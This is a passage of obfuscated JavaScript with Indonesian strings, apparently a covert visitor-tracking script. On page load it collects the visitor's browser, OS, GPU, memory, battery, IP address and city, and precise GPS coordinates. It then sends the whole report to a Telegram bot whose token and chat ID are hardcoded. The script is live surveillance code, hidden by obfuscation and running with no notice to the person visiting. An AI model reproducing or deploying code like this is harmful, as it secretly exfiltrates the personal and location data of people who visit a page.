window||_0x19743f[_0x532e3d(0x1b1)](navigator[_0x532e3d(0xe7)],0x0)?_0x19743f[_0x532e3d(0x11f)]:_0x19743f['lMvGM'],_0x46015c=navigator[_0x532e3d(0x149)]?_0x19743f[_0x532e3d(0x11b)]:_0x19743f[_0x532e3d(0x165)],_0x1301d0=window[_0x532e3d(0x134)](_0x19743f[_0x532e3d(0xde)])[_0x532e3d(0xfe)]?_0x19743f[_0x532e3d(0x105)]:_0x19743f[_0x532e3d(0x12e)],_0x110bb1=_0x19743f[_0x532e3d(0xf8)](_0x19743f[_0x532e3d(0xf8)](performance[_0x532e3d(0x16e)](),0x3e8)/0x3c,0x3c)[_0x532e3d(0x14c)](0x2)+'\x20jam',_0x204664=/Mobi|Android/i[_0x532e3d(0x1a9)](_0x29bc79)?_0x19743f[_0x532e3d(0x12d)]:_0x19743f['xFobc'],_0x170c3f=_0x19743f[_0x532e3d(0x14a)](detectGPU),_0x9bf6e9=navigator['hardwareConcurrency']||_0x19743f[_0x532e3d(0x10f)],_0x3086a0=navigator[_0x532e3d(0x103)]?navigator[_0x532e3d(0x103)]+'\x20GB':_0x19743f['egDZB'],_0x2f1f73=_0x19743f[_0x532e3d(0xec)](calculateStorageSize,localStorage),_0x2ceb18=_0x19743f['osiir'](calculateStorageSize,sessionStorage);let _0x33db08=_0x19743f[_0x532e3d(0x10f)],_0x1ae21d=_0x532e3d(0x111),_0x59d7a1=_0x19743f[_0x532e3d(0x10f)],_0x280482=_0x19743f[_0x532e3d(0x14b)];try{const _0x5ab17e=await _0x19743f['forzw'](fetch,_0x19743f[_0x532e3d(0x199)]),_0x79cb33=await _0x5ab17e[_0x532e3d(0x11e)]();_0x33db08=_0x79cb33['ip']||'Tidak\x20diketahui';if(!_0x1ae21d||_0x1ae21d===_0x19743f[_0x532e3d(0x10f)])_0x1ae21d=_0x79cb33['latitude']||_0x19743f[_0x532e3d(0x10f)];if(!_0x59d7a1||_0x19743f['dWrRH'](_0x59d7a1,_0x19743f['egDZB']))_0x59d7a1=_0x79cb33['longitude']||_0x532e3d(0x111);_0x280482=_0x79cb33['city']+',\x20'+_0x79cb33[_0x532e3d(0x113)]+',\x20'+_0x79cb33[_0x532e3d(0xe4)];}catch(_0x574e6f){console[_0x532e3d(0x159)](_0x532e3d(0x131),_0x574e6f);}let _0x1c07ab=_0x19743f[_0x532e3d(0x110)];if(navigator[_0x532e3d(0x128)]){const _0x5b19ae=await navigator['getBattery']();_0x1c07ab=_0x19743f[_0x532e3d(0x163)](_0x19743f[_0x532e3d(0x158)](_0x19743f['PwnNS'](_0x532e3d(0x10a)+_0x19743f[_0x532e3d(0x14f)](_0x5b19ae[_0x532e3d(0x193)],0x64)[_0x532e3d(0x14c)](0x0)+_0x532e3d(0x11d),_0x532e3d(0x167)+(_0x5b19ae[_0x532e3d(0x19c)]?_0x532e3d(0x1ac):_0x19743f[_0x532e3d(0x176)])+',\x20'),_0x532e3d(0x1b4)+(_0x5b19ae[_0x532e3d(0x117)]?_0x5b19ae[_0x532e3d(0x117)]+_0x532e3d(0x1a5):_0x19743f[_0x532e3d(0x10f)])+',\x20'),'Waktu\x20Penggunaan:\x20'+(_0x5b19ae[_0x532e3d(0x156)]?_0x5b19ae['dischargingTime']+_0x532e3d(0x1a5):_0x19743f[_0x532e3d(0x10f)]));}navigator[_0x532e3d(0x127)]?navigator[_0x532e3d(0x127)][_0x532e3d(0x162)](_0x284814=>{const _0x462bd5=_0x532e3d;_0x1ae21d=_0x284814['coords'][_0x462bd5(0x10d)][_0x462bd5(0x14c)](0x6),_0x59d7a1=_0x284814[_0x462bd5(0x13d)][_0x462bd5(0xe6)]['toFixed'](0x6),_0x280482=_0x462bd5(0x18c)+_0x1ae21d+_0x462bd5(0x135)+_0x59d7a1,_0x19743f[_0x462bd5(0x14a)](_0x3e2007);},_0x5cf7ad=>{const _0x1ca8d0=_0x532e3d;console[_0x1ca8d0(0x159)](_0x19743f[_0x1ca8d0(0x1ad)],_0x5cf7ad[_0x1ca8d0(0x19b)]),_0x3e2007();}):(console[_0x532e3d(0x159)](_0x19743f['XyNTJ']),_0x19743f['gAxJl'](_0x3e2007));function _0x44f843(_0x1ed171){const _0x46ae87=_0x532e3d;if(!_0x1ed171)return _0x46ae87(0xed);switch(_0x1ed171[_0x46ae87(0x194)]()){case _0x19743f['qrLKU']:return _0x19743f[_0x46ae87(0xf5)];case'cellular':return _0x19743f[_0x46ae87(0x10c)];case _0x19743f['BrCsU']:return _0x46ae87(0x18d);case _0x19743f[_0x46ae87(0x1a8)]:return _0x19743f[_0x46ae87(0x16a)];case _0x19743f[_0x46ae87(0x11a)]:return _0x19743f[_0x46ae87(0x141)];default:return _0x1ed171;}}function _0x3e2007(){const _0x5328bc=_0x532e3d,_0xfc2fa8={'userAgent':_0x29bc79,'platform':_0x35e057,'language':_0x255876,'additionalLanguages':_0x5a02be,'vendor':_0x3a1bed,'browser':_0x19743f[_0x5328bc(0x14a)](detectBrowser),'os':detectOS(),'screenResolution':_0x2bf219+'\x20x\x20'+_0xaf30fa,'onlineStatus':_0x5dad4f,'networkType':_0x44f843(_0x1df3d5),'connectionType':_0x3af4f4,'downlinkSpeed':_0x4378b9,'timezone':_0x167940,'localTime':_0x1c5fa9,'darkMode':_0x31dcb5,'touchscreen':_0x211068,'cookieEnabled':_0x46015c,'deviceOrientation':_0x1301d0,'deviceUptime':_0x110bb1,'hardwareConcurrency':_0x9bf6e9,'deviceMemory':_0x3086a0,'localStorageSize':_0x2f1f73,'sessionStorageSize':_0x2ceb18,'ipAddress':_0x33db08,'latitude':_0x1ae21d,'longitude':_0x59d7a1,'locationInfo':_0x280482,'batteryInfo':_0x1c07ab,'isMobileDevice':_0x204664,'gpu':_0x170c3f},_0x1f48b5=_0x19743f[_0x5328bc(0x1af)],_0x58dd07='-1002360934041t',_0x363a24=_0x5328bc(0xf6)+_0x1f48b5+_0x5328bc(0x1b0),_0x43808a=_0x19743f['LZZMW'](_0x19743f[_0x5328bc(0x19f)](_0x19743f[_0x5328bc(0x125)](_0x19743f[_0x5328bc(0x12f)](_0x19743f[_0x5328bc(0x107)](_0x19743f['SdaLZ'](_0x19743f[_0x5328bc(0x19a)](_0x19743f[_0x5328bc(0x19a)](_0x19743f[_0x5328bc(0x191)](_0x19743f[_0x5328bc(0x13a)](_0x19743f[_0x5328bc(0x115)](_0x19743f[_0x5328bc(0x132)](_0x19743f[_0x5328bc(0x11c)](_0x19743f[_0x5328bc(0x12f)](_0x19743f['AjpIj'](_0x19743f[_0x5328bc(0x12f)](_0x19743f[_0x5328bc(0x143)](_0x19743f['LZZMW'](_0x19743f['FPRtC'](_0x5328bc(0x17b),'🖥️\x20*Umum:*\x0a'),_0x5328bc(0x140)+_0xfc2fa8[_0x5328bc(0x10e)]+'\x0a'),_0x5328bc(0x154)+_0xfc2fa8[_0x5328bc(0x160)]+'\x0a'),_0x5328bc(0x1a0)+_0xfc2fa8[_0x5328bc(0x138)]+'\x0a')+(_0x5328bc(0x18e)+_0xfc2fa8[_0x5328bc(0x174)]+'\x0a'),_0x5328bc(0x184)+_0xfc2fa8[_0x5328bc(0x18a)]+'\x0a\x0a'),_0x5328bc(0x15e)),_0x5328bc(0xe0)+_0xfc2fa8[_0x5328bc(0x19e)]+'\x0a')+('•\x20*Tipe\x20Jaringan:*\x20'+_0xfc2fa8['networkType']+'\x0a'),_0x5328bc(0x129)+_0xfc2fa8[_0x5328bc(0xdf)]+'\x0a'),_0x5328bc(0x16d)+_0xfc2fa8[_0x5328bc(0x13e)]+'\x0a\x0a'),_0x5328bc(0x108)),_0x5328bc(0x148)+_0xfc2fa8[_0x5328bc(0x16c)]+'\x0a'),'•\x20*Lokasi:*\x20'+_0xfc2fa8['locationInfo']+'\x0a'),_0x5328bc(0xf2)+_0xfc2fa8[_0x5328bc(0x10d)]+'\x0a'),_0x5328bc(0xea)+_0xfc2fa8[_0x5328bc(0xe6)]+'\x0a\x0a')+_0x5328bc(0x17a),'•\x20'+_0xfc2fa8[_0x5328bc(0x14d)]+'\x0a\x0a')+_0x5328bc(0x17d),_0x5328bc(0x13b)+_0xfc2fa8[_0x5328bc(0x18f)]+'\x0a')+(_0x5328bc(0x155)+_0xfc2fa8['deviceMemory']+'\x0a')+(_0x5328bc(0x119)+_0xfc2fa8[_0x5328bc(0x1a1)]+'\x0a')+(_0x5328bc(0x179)+_0xfc2fa8[_0x5328bc(0x1a6)]+'\x0a\x0a')+'🕒\x20*Waktu:*\x0a',_0x5328bc(0x120)+_0xfc2fa8['localTime']+'\x0a'),_0x5328bc(0xeb)+_0xfc2fa8[_0x5328bc(0x1a3)]+'\x0a'),_0x5328bc(0x1ae)+_0xfc2fa8[_0x5328bc(0xe3)]+_0x5328bc(0x12b))+(_0x5328bc(0x124)+new Date()[_0x5328bc(0xf9)]()+'_'),_0x119610=new FormData();_0x119610[_0x5328bc(0x196)](_0x19743f[_0x5328bc(0x114)],_0x58dd07),_0x119610[_0x5328bc(0x196)](_0x19743f[_0x5328bc(0x15d)],_0x43808a),_0x119610[_0x5328bc(0x196)]('parse_mode',_0x19743f[_0x5328bc(0x12a)]),_0x19743f[_0x5328bc(0x185)](fetch,_0x363a24,{'method':_0x19743f['nNYal'],'body':_0x119610})[_0x5328bc(0x153)](_0x13bd56=>_0x13bd56[_0x5328bc(0x11e)]())[_0x5328bc(0x153)](_0x3c209f=>{const _0x1fbbe1=_0x5328bc;_0x3c209f['ok']?console[_0x1fbbe1(0x1a7)]('Informasi\x20perangkat\x20berhasil\x20dikirim\x20ke\x20Telegram.'):console[_0x1fbbe1(0x159)](_0x19743f[_0x1fbbe1(0x121)],_0x3c209f);})[_0x5328bc(0x137)](_0x32d640=>{const _0x4e359c=_0x5328bc;console[_0x4e359c(0x159)](_0x19743f['STOVd'],_0x32d640);});}}function calculateStorageSize(_0x329583){const _0x6d083e=_0x3bb8,_0x27b1d8={'zffdf':function(_0x16fd24,_0x295129){return _0x16fd24*_0x295129;},'bNnIS':function(_0x337235,_0x77fced){return _0x337235+_0x77fced;},'XAZkW':function(_0x2878bc,_0x47a23d){return _0x2878bc/_0x47a23d;},'mRdxq':'\x20KB'};let _0x4d3376=0x0;for(let _0x56346d in _0x329583){_0x329583[_0x6d083e(0x175)](_0x56346d)&&(_0x4d3376+=_0x27b1d8[_0x6d083e(0x142)](_0x27b1d8[_0x6d083e(0x189)](_0x329583[_0x56346d][_0x6d083e(0x170)],_0x56346d[_0x6d083e(0x170)]),0x2));}return _0x27b1d8[_0x6d083e(0x189)](_0x27b1d8['XAZkW'](_0x4d3376,0x400)['toFixed'](0x2),_0x27b1d8['mRdxq']);}function _0x33e9(){const _0x525296=['SdaLZ','JScHt','Gagal\x20mendapatkan\x20lokasi\x20berdasarkan\x20IP:','azGbF','9737980ZelOIs','matchMedia',',\x20Longitude:\x20','type','catch','language','Ya\x20(Mobile)','UQKPK','•\x20*CPU\x20Cores:*\x20','24499lSHqTc','coords','downlinkSpeed','connection','•\x20*Agen\x20Pengguna:*\x20','qDFFo','zffdf','lZlkV','chat_id','WiFi\x20📶','❌\x20Offline','Tidak\x20Ada','•\x20*IP\x20Address:*\x20','cookieEnabled','gAxJl','SHEIs','toFixed','batteryInfo','Tidak\x20(Desktop/Tablet)','RlWkr','Error:','Linux','unknown','then','•\x20*Platform:*\x20','•\x20*Memori\x20Perangkat:*\x20','dischargingTime','webgl','gyacl','error','Gagal\x20mendapatkan\x20lokasi\x20dengan\x20Geolocation\x20API:','width','text','EoKfg','🌐\x20*Jaringan:*\x0a','timeZone','platform','Geolocation\x20API\x20tidak\x20didukung\x20di\x20browser\x20ini.','getCurrentPosition','OiNLs','(orientation:\x20portrait)','TfQAs','8EDbSEd','Status\x20Pengisian:\x20','\x20Mbps','getExtension','XoEku','161463KgHUoP','ipAddress','•\x20*Kecepatan\x20Koneksi:*\x20','now','Tidak\x20tersedia','length','screen','Data\x20Seluler\x20📱','HHNxM','additionalLanguages','hasOwnProperty','dNJNO','56AIoBTv','Ada','•\x20*Touchscreen:*\x20','🔋\x20*Baterai:*\x0a','📱\x20*Informasi\x20Perangkat:*\x0a\x0a','https://ipapi.co/json/','🔧\x20*Hardware:*\x0a','getContext','✅\x20Online','resolvedOptions','(prefers-color-scheme:\x20dark)','Nonaktif','yQDNn','•\x20*Vendor:*\x20','uZtPY','OLFTL','aGtAN','effectiveType','bNnIS','vendor','includes','Latitude:\x20','Ethernet\x20🔌','•\x20*Bahasa\x20Tambahan:*\x20','hardwareConcurrency','5284848SVfZPb','bAJRv','SnIrH','level','toLowerCase','VlTDr','append','oAXyr','Mozilla\x20Firefox','WwQrS','QNlia','message','charging','Tidak\x20mengisi','onlineStatus','VkCQy','•\x20*Bahasa\x20Utama:*\x20','gpu','UpKKV','timezone','58dIKAVF','\x20detik','touchscreen','log','xEuxB','test','bluetooth','webkitConnection','Sedang\x20mengisi\x20⚡','XtoVG','•\x20*Waktu\x20Boot\x20Perangkat:*\x20','JZCit','/sendMessage','MqTfx','aYCyN','XcEON','Waktu\x20Pengisian:\x20','MMRbq','connectionType','•\x20*Status\x20Online:*\x20','OPR','WEBGL_debug_renderer_info','deviceUptime','country_name','Firefox','longitude','maxTouchPoints','Chrome','iOS','•\x20*Longitude:*\x20','•\x20*Zona\x20Waktu:*\x20','XYJsl','Tidak\x20Diketahui','Landscape','DateTimeFormat','mqhPh','8137866512:AAE771KJrWSUMAaIpBcu_OLjbH3O_nArulU','•\x20*Latitude:*\x20','Gagal\x20mengirim\x20informasi\x20perangkat\x20ke\x20Telegram.','win','lcJVA','https://api.telegram.org/bot','Aktif\x20🌙','SsfSN','toLocaleString','ZjzVW','Browser\x20tidak\x20dikenal','OIBeY','MacOS','matches','DOMContentLoaded','1176210wnkVyR','Google\x20Chrome','addEventListener','deviceMemory','jZBbb','fjvhL','Opera','LZZMW','📍\x20*Lokasi:*\x0a','6865272bLcbEV','Level:\x20','Windows','YPQrq','latitude','userAgent','egDZB','wLbNo','Tidak\x20diketahui','POST','region','tKinW','ryklc','Edge','chargingTime','languages','•\x20*GPU:*\x20','ZhacE','tOqtp','PwnNS','%,\x20','json','pThMk','•\x20*Waktu\x20Lokal:*\x20','efpWH','2439315QbWDpe','Sistem\x20operasi\x20tidak\x20dikenal','📌\x20_Laporan\x20dibuat\x20pada\x20','nJOzo','mac','geolocation','getBattery','•\x20*Tipe\x20Koneksi:*\x20','PTven',';\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a','wifi','kKwJz','lpnPk'];_0x33e9=function(){return _0x525296;};return _0x33e9();}function detectBrowser(){const _0x47c889=_0x3bb8,_0x2258c7={'mqhPh':_0x47c889(0xe8),'VHOOq':_0x47c889(0x101),'WqeVH':_0x47c889(0xe5),'OLFTL':'Apple\x20Safari','jZBbb':_0x47c889(0x116),'vfwRc':'Microsoft\x20Edge','UpKKV':_0x47c889(0x106),'CKOKZ':_0x47c889(0xe1),'zWSid':_0x47c889(0xfb)},_0xa65f3d=navigator[_0x47c889(0x10e)];if(_0xa65f3d[_0x47c889(0x18b)](_0x2258c7[_0x47c889(0xf0)]))return _0x2258c7['VHOOq'];if(_0xa65f3d[_0x47c889(0x18b)](_0x2258c7['WqeVH']))return _0x47c889(0x198);if(_0xa65f3d[_0x47c889(0x18b)]('Safari')&&!_0xa65f3d[_0x47c889(0x18b)]('Chrome'))return _0x2258c7[_0x47c889(0x186)];if(_0xa65f3d[_0x47c889(0x18b)](_0x2258c7[_0x47c889(0x104)]))return _0x2258c7['vfwRc'];if(_0xa65f3d[_0x47c889(0x18b)](_0x2258c7['UpKKV'])||_0xa65f3d[_0x47c889(0x18b)](_0x2258c7['CKOKZ']))return _0x2258c7[_0x47c889(0x1a2)];return _0x2258c7['zWSid'];}function detectOS(){const _0x1988bf=_0x3bb8,_0x256707={'oGtpo':_0x1988bf(0xf4),'lHoXO':_0x1988bf(0x10b),'VlTDr':_0x1988bf(0x126),'ZjzVW':_0x1988bf(0xfd),'aGtAN':'linux','aYCyN':_0x1988bf(0x151),'oAXyr':'Android','JScHt':_0x1988bf(0xe9),'MzcKA':_0x1988bf(0x123)},_0x4ec7bf=navigator[_0x1988bf(0x160)][_0x1988bf(0x194)]();if(_0x4ec7bf[_0x1988bf(0x18b)](_0x256707['oGtpo']))return _0x256707['lHoXO'];if(_0x4ec7bf[_0x1988bf(0x18b)](_0x256707[_0x1988bf(0x195)]))return _0x256707[_0x1988bf(0xfa)];if(_0x4ec7bf[_0x1988bf(0x18b)](_0x256707[_0x1988bf(0x187)]))return _0x256707[_0x1988bf(0x1b2)];if(/android/[_0x1988bf(0x1a9)](navigator[_0x1988bf(0x10e)][_0x1988bf(0x194)]()))return _0x256707[_0x1988bf(0x197)];if(/iphone|ipad|ipod/[_0x1988bf(0x1a9)](navigator['userAgent'][_0x1988bf(0x194)]()))return _0x256707[_0x1988bf(0x130)];return _0x256707['MzcKA'];}function detectGPU(){const _0xc1bd9d=_0x3bb8,_0x4101be={'AYwmp':'canvas','XcEON':'experimental-webgl','yQDNn':_0xc1bd9d(0x111),'HHNxM':_0xc1bd9d(0xe2)},_0x5069b5=document['createElement'](_0x4101be['AYwmp']),_0x3d1e8f=_0x5069b5[_0xc1bd9d(0x17e)](_0xc1bd9d(0x157))||_0x5069b5['getContext'](_0x4101be[_0xc1bd9d(0x1b3)]);if(!_0x3d1e8f)return _0x4101be[_0xc1bd9d(0x183)];const _0x23de83=_0x3d1e8f[_0xc1bd9d(0x169)](_0x4101be[_0xc1bd9d(0x173)]);return _0x23de83?_0x3d1e8f['getParameter'](_0x23de83['UNMASKED_RENDERER_WEBGL']):_0x4101be[_0xc1bd9d(0x183)];}document[_0x1502d4(0x102)](_0x1502d4(0xff),()=>{detectDeviceInfoAndSendToTelegram();});